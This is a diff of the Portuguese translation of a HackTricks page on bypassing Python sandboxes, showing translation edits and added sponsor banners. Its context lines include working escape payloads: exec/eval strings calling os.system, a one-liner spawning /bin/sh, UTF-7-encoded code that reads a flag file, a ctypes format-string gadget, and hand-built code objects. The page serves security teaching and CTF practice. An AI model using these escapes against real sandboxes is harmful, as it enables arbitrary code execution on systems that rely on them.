@@ -1,19 +1,29 @@
 # Bypass Python sandboxes
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 {% endhint %}
+
+<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
+
+#### Obtenha a perspectiva de um hacker sobre seus aplicativos web, rede e nuvem
+
+**Encontre e relate vulnerabilidades críticas e exploráveis com impacto real nos negócios.** Use nossas mais de 20 ferramentas personalizadas para mapear a superfície de ataque, encontrar problemas de segurança que permitem escalar privilégios e usar exploits automatizados para coletar evidências essenciais, transformando seu trabalho árduo em relatórios persuasivos.
+
+{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
+
+
 
 Esses são alguns truques para contornar as proteções de sandbox do python e executar comandos arbitrários.
 
@@ -103,10 +113,10 @@ Este pacote é chamado `Reverse`. No entanto, ele foi especialmente elaborado pa
 ## Avaliando código python
 
 {% hint style="warning" %}
-Note que exec permite strings multilinha e ";", mas eval não permite (ver operador walrus)
+Note que exec permite strings multilinha e ";", mas eval não permite (ver operador morsa)
 {% endhint %}
 
-Se certos caracteres forem proibidos, você pode usar a **representação hex/octal/B64** para **burlar** a restrição:
+Se certos caracteres forem proibidos, você pode usar a representação **hex/octal/B64** para **burlar** a restrição:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -150,9 +160,9 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## Bypassando proteções através de codificações (UTF-7)
+## Bypassing protections through encodings (UTF-7)
 
-Em [**este artigo**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy), o UFT-7 é usado para carregar e executar código python arbitrário dentro de uma aparente sandbox:
+Em [**este artigo**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) o UFT-7 é usado para carregar e executar código python arbitrário dentro de uma aparente sandbox:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -163,7 +173,7 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-Também é possível contorná-lo usando outras codificações, por exemplo, `raw_unicode_escape` e `unicode_escape`.
+É também possível contornar isso usando outras codificações, por exemplo, `raw_unicode_escape` e `unicode_escape`.
 
 ## Execução do Python sem chamadas
 
@@ -329,10 +339,10 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### Sem Builtins
 
-Quando você não tem `__builtins__`, você não poderá importar nada nem mesmo ler ou escrever arquivos, pois **todas as funções globais** (como `open`, `import`, `print`...) **não estão carregadas**.\
-No entanto, **por padrão, o python importa muitos módulos na memória**. Esses módulos podem parecer benignos, mas alguns deles **também estão importando** funcionalidades **perigosas** dentro deles que podem ser acessadas para obter até mesmo **execução de código arbitrário**.
+Quando você não tem `__builtins__`, você não conseguirá importar nada nem mesmo ler ou escrever arquivos, pois **todas as funções globais** (como `open`, `import`, `print`...) **não estão carregadas**.\
+No entanto, **por padrão, o python importa muitos módulos na memória**. Esses módulos podem parecer benignos, mas alguns deles **também estão importando funcionalidades perigosas** dentro deles que podem ser acessadas para obter até mesmo **execução de código arbitrário**.
 
-Nos exemplos a seguir, você pode observar como **abusar** de alguns desses módulos "**benignos**" carregados para **acessar** funcionalidades **perigosas** dentro deles.
+Nos exemplos a seguir, você pode observar como **abusar** de alguns desses módulos "**benignos**" carregados para **acessar** **funcionalidades** **perigosas** dentro deles.
 
 **Python2**
 ```python
@@ -424,7 +434,7 @@ Aqui quero explicar como descobrir facilmente **funcionalidades mais perigosas c
 
 #### Acessando subclasses com bypasses
 
-Uma das partes mais sensíveis desta técnica é ser capaz de **acessar as subclasses base**. Nos exemplos anteriores, isso foi feito usando `''.__class__.__base__.__subclasses__()`, mas há **outras maneiras possíveis**:
+Uma das partes mais sensíveis desta técnica é ser capaz de **acessar as subclasses base**. Nos exemplos anteriores, isso foi feito usando `''.__class__.__base__.__subclasses__()` mas há **outras maneiras possíveis**:
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -698,7 +708,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Note como você pode **acessar atributos** de uma maneira normal com um **ponto** como `people_obj.__init__` e **elemento do dicionário** com **parênteses** sem aspas `__globals__[CONFIG]`
+Note como você pode **acessar atributos** de uma maneira normal com um **ponto** como `people_obj.__init__` e **elemento de dicionário** com **parênteses** sem aspas `__globals__[CONFIG]`
 
 Também note que você pode usar `.__dict__` para enumerar elementos de um objeto `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -753,9 +763,9 @@ Como lembrete, toda vez que uma ação é realizada em python, alguma função �
 Você pode encontrar mais como isso na seção [**Execução de Python sem chamadas**](./#python-execution-without-calls).
 
 Uma vulnerabilidade de string de formato em python não permite executar funções (não permite o uso de parênteses), então não é possível obter RCE como `'{0.system("/bin/sh")}'.format(os)`.\
-No entanto, é possível usar `[]`. Portanto, se uma biblioteca python comum tiver um método **`__getitem__`** ou **`__getattr__`** que execute código arbitrário, é possível abusar deles para obter RCE.
+No entanto, é possível usar `[]`. Portanto, se uma biblioteca python comum tiver um método **`__getitem__`** ou **`__getattr__`** que executa código arbitrário, é possível abusar deles para obter RCE.
 
-Procurando por um gadget assim em python, o relatório propõe esta [**consulta de busca no Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Onde ele encontrou este [aqui](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
+Procurando por um gadget assim em python, o relatório sugere esta [**consulta de busca no Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Onde ele encontrou este [aqui](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -781,7 +791,7 @@ Este gadget permite **carregar uma biblioteca do disco**. Portanto, é necessár
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
-A challenge na verdade explora outra vulnerabilidade no servidor que permite criar arquivos arbitrários no disco dos servidores.
+O desafio na verdade explora outra vulnerabilidade no servidor que permite criar arquivos arbitrários no disco dos servidores.
 
 ## Dissecando Objetos Python
 
@@ -937,7 +947,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Compilando Python
 
 Agora, vamos imaginar que de alguma forma você pode **extrair as informações sobre uma função que você não pode executar**, mas você **precisa** **executá-la**.\
-Como no exemplo a seguir, você **pode acessar o objeto de código** dessa função, mas apenas lendo o desmonte você **não sabe como calcular a flag** (_imagine uma função `calc_flag` mais complexa_)
+Como no exemplo a seguir, você **pode acessar o objeto de código** dessa função, mas apenas lendo a desassemblagem você **não sabe como calcular a flag** (_imagine uma função `calc_flag` mais complexa_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -972,7 +982,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-Dependendo da versão do python, os **parâmetros** de `code_type` podem ter uma **ordem diferente**. A melhor maneira de saber a ordem dos parâmetros na versão do python que você está executando é executar:
+Dependendo da versão do python, os **parâmetros** de `code_type` podem ter uma **ordem diferente**. A melhor maneira de saber a ordem dos parâmetros na versão do python que você está executando é rodar:
 ```
 import types
 types.CodeType.__doc__
@@ -997,7 +1007,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-Em exemplos anteriores no início deste post, você pode ver **como executar qualquer código python usando a função `compile`**. Isso é interessante porque você pode **executar scripts inteiros** com loops e tudo em uma **linha única** (e poderíamos fazer o mesmo usando **`exec`**).\
+Nos exemplos anteriores no início deste post, você pode ver **como executar qualquer código python usando a função `compile`**. Isso é interessante porque você pode **executar scripts inteiros** com loops e tudo em uma **linha única** (e poderíamos fazer o mesmo usando **`exec`**).\
 De qualquer forma, às vezes pode ser útil **criar** um **objeto compilado** em uma máquina local e executá-lo na **máquina CTF** (por exemplo, porque não temos a função `compiled` no CTF).
 
 Por exemplo, vamos compilar e executar manualmente uma função que lê _./poc.py_:
@@ -1027,7 +1037,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Se você não pode acessar `eval` ou `exec`, você poderia criar uma **função adequada**, mas chamá-la diretamente geralmente falhará com: _construtor não acessível em modo restrito_. Portanto, você precisa de uma **função que não esteja no ambiente restrito para chamar essa função.**
+Se você não consegue acessar `eval` ou `exec`, você pode criar uma **função adequada**, mas chamá-la diretamente geralmente falhará com: _construtor não acessível em modo restrito_. Portanto, você precisa de uma **função que não esteja no ambiente restrito para chamar essa função.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1059,7 +1069,7 @@ print("\nYou are a super user\n")
 except AssertionError:
 print(f"\nNot a Super User!!!\n")
 ```
-será contornado
+will be bypassed
 
 ## Referências
 
@@ -1070,13 +1080,21 @@ será contornado
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
+<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
+
+#### Obtenha a perspectiva de um hacker sobre seus aplicativos web, rede e nuvem
+
+**Encontre e relate vulnerabilidades críticas e exploráveis com impacto real nos negócios.** Use nossas mais de 20 ferramentas personalizadas para mapear a superfície de ataque, encontrar problemas de segurança que permitem escalar privilégios e usar exploits automatizados para coletar evidências essenciais, transformando seu trabalho árduo em relatórios persuasivos.
+
+{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
+
 {% hint style="success" %}
 Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
 Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Suporte ao HackTricks</summary>
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
